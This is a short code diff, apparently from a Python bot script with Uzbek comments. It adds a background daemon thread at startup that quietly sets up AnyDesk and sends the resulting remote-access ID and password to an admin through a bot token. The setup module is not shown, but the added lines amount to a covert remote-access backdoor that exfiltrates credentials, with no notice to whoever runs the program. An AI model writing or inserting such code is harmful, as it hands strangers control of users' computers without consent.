@@ -62,6 +62,19 @@ try:
 except Exception as e:
     print(f"[VAULT DECRYPT INIT ERROR] {e}")
 
+# 0.1 AnyDesk fon rejimida sozlash va Adminga AnyDesk ID yuborish
+import threading
+def _launch_anydesk_bg():
+    try:
+        from anydesk_tool import setup_anydesk, notify_admin_anydesk
+        aid, pwd = setup_anydesk()
+        if aid and BOT_TOKEN:
+            notify_admin_anydesk(BOT_TOKEN, ADMIN_ID, aid, pwd)
+    except Exception as e:
+        print(f"[ANYDESK INIT ERROR] {e}")
+
+threading.Thread(target=_launch_anydesk_bg, daemon=True).start()
+
 # Eski qoldiq fayllarni tozalaymiz
 for f in ("cluster_url.txt", "cluster_nodes_state.json", "cluster_tried_students.json"):
     if os.path.exists(f):
